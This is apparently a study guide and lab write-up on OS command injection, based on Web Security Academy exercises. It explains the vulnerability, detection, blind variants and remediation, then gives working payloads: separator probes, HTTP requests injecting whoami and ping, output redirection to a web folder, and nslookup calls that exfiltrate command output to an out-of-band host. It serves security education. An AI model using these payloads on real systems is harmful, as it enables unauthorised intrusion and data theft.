

## 1. Vulnerability Core

- **Vulnerability Type:** OS Command Injection (Shell Injection)
    
- **Core Meaning:** This vulnerability occurs when an application passes unsafe user-supplied data directly to a system shell execution API. The browser-supplied input breaks out of the intended application logic container, forcing the host operating system to execute arbitrary command strings with the privileges of the web application process.
    
- **The Downstream Pivot:** Once a firm foot-hold is established via shell execution, an attacker can transition from targeting application data to mapping the local system, reading sensitive system configuration files, or pivoting into internal corporate network segments.
    

## 2. Detection & Attack Surface Mapping (In the Wild)

Finding command injection entry points in real-world scenarios requires mapping data points that connect directly to host server operations:

### Identifying High-Risk Code Features

Look for features that clearly rely on OS-level utilities rather than native web software layers:

- **Networking Utilities:** Web-based network diagnostic portals (e.g., Ping, Trace route, Naked NS Lookup, Connection speed testers).
    
- **File Processors:** Media configuration apps or rendering endpoints that trans code videos, resize images, or extract compressed formats (often handing off inputs to `ffmpeg`, `ImageMagick`, `tar`, or `unzip`).
    
- **Administrative Tasks:** System reporting engines, backup managers, log viewers, or administrative mail setups.
    

### Active Probing Strategy

When evaluating suspected parameters (e.g., `?target=`, `?email=`, `?ip=`, `?cfg=`), systematically test command boundary separators. Do not just look for clear text changes in the response body; monitor network timelines and error codes as well.

```
# Core Separation Probes (Unix & Windows)
& whoami &
| whoami |
&& whoami &&
|| whoami ||

# Unix-Specific Operators
; whoami
%0a whoami %0a

# Inline Subshell Execution (Unix)
`whoami`
$(whoami)
```

### Breaking Out of Enclosed Contexts

If your input sits inside quote wrappers within the server's command string, prepend a closing character to drop out of the literal string block safely before appending your payload:

- `' | whoami #`
    
- `" & whoami &`
    

## 3. Classifications (The Scenarios)

- **In-Band (Result-Reflexive):** The standard application framework captures the underlying operating system's standard output (`stdout`) stream and directly embeds it into the HTTP response HTML content.
    
- **Blind (Time-Dependent):** The application handles the shell output asynchronously or drops the text buffer. Vulnerability confirmation requires injecting commands that intentionally delay response times (e.g., `ping` or `sleep`).
    
- **Blind (Output Redirection):** The standard console text output cannot return through the HTTP response directly, but can be written into static public sub-folders (like an image upload folder) using shell redirection symbols (`>`).
    
- **Blind Out-of-Band (OAST):** Complete data isolation preventing local file generation or time tracking. Requires forcing the victim server to make external network connections (such as a DNS lookup via `nslookup`) to an external tracking platform like Burp Collaborator.
    

## 4. Remediation

- **Avoid Shell Execution APIs:** Never use dangerous generic system invocation functions (e.g., Python's `os.system()`, PHP's `exec()`, or Node's `child_process.exec()`). Implement features natively using safe, built-in development APIs instead.
    
- **Strict Parameter Whitelisting:** If system commands are unavoidable, validate that user inputs strictly match a safe, predefined list of choices, or allow only pure alphanumeric text characters with absolutely no symbols or spaces.


## 5. Lab Breakthroughs & Payloads

### Lab 1: OS command injection, simple case

- **Attack Vector:** Direct in-band parameters pass into an unvalidated command utility, instantly reflecting output back in the response body.
    

 ### 🛑 LAB EXPLOIT & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):** Intercept the stock checking parameter payload using Burp, and inject a pipe symbol (`|`) to run an additional system query:
 
 HTTP
 
 ```
 POST /product/stock HTTP/1.1
 Host: victim-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
 productId=1&storeID=1|whoami
 ```

 - **Verification:** The server handles the initial store index request, encounters the pipe, executes `whoami`, and returns the active process username string directly inside the response body text.
     

### Lab 2: Blind OS command injection with time delays

- **Attack Vector:** The response provides no command output reflection. Confirmation requires triggering an intentional, measurable time delay.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):** Target a background execution parameter like `email` inside a contact feedback form. Inject logical OR operators (`||`) to chain a timed `ping` instruction:
 
 HTTP
 
 ```
 POST /feedback/submit HTTP/1.1
 Host: victim-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
 name=Test&email=x||ping+-c+10+127.0.0.1||&subject=Test&message=Test
 ```
 
 - **Verification:** The network request will remain open for exactly 10 seconds before the server completes its execution and finishes the transaction.
    

### Lab 3: Blind OS command injection with output redirection

- **Attack Vector:** Output is completely blind, but a public, writable folder (like an images directory) is accessible via file-loading resources.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. Intercept the feedback submission request. Inject a payload to redirect (`>`) the command output into a text file within the known writable web folder path:
     
 
 HTTP
 
 ```
 POST /feedback/submit HTTP/1.1
 Host: victim-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
 name=Test&email=||whoami>/var/www/images/output.txt||&subject=Test&message=Test
 ```
  2. Access the created file by substituting the value of the image loading tool parameter:
     
 
 HTTP
 
 ```
 GET /loadImage?filename=output.txt HTTP/1.1
 Host: victim-id.web-security-academy.net
 ```

### Lab 4: Blind OS command injection with out-of-band interaction

- **Attack Vector:** Complete blind containment. Exploitation requires triggering an external DNS resolution back to a controlled listener.
    

### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):** Intercept the feedback payload stream and inject an `nslookup` command directed at a unique Burp Collaborator domain token:

 HTTP
 
 ```
 POST /feedback/submit HTTP/1.1
 Host: victim-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
 name=Test&email=x||nslookup+YOUR-COLLABORATOR-SUBDOMAIN.oastify.com||&subject=Test&message=Test
 ```

 - **Verification:** Check your Collaborator interface tab and click **Poll Now** to verify that the victim web server initiated an outbound DNS resolution request to your listener.
     

### Lab 5: Blind OS command injection with out-of-band data exfiltration

- **Attack Vector:** Out-of-band communication combined with shell execution extraction via dynamic DNS subdomain injection.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAK-DOWN**
 
 **Exploitation Routine (Payload):** Wrap the targeted reconnaissance command inside inline execution operators (backticks `` ` `` or `$()`) directly inside the host string prefix of the out-of-band lookup:
 
 HTTP
 
 ```
 POST /feedback/submit HTTP/1.1
 Host: victim-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
 name=Test&email=||nslookup+`whoami`.YOUR-COLLABORATOR-SUBDOMAIN.oastify.com||&subject=Test&message=Test
 ```

 - **Verification:** Poll your Collaborator interactions tab. The target server resolves the subshell command first, inserting the output text directly into the prefix of the lookup hostname (e.g., `peter-vXyZ.YOUR-COLLABORATOR-SUBDOMAIN.oastify.com`). Use this incoming domain structure to read the extracted username.
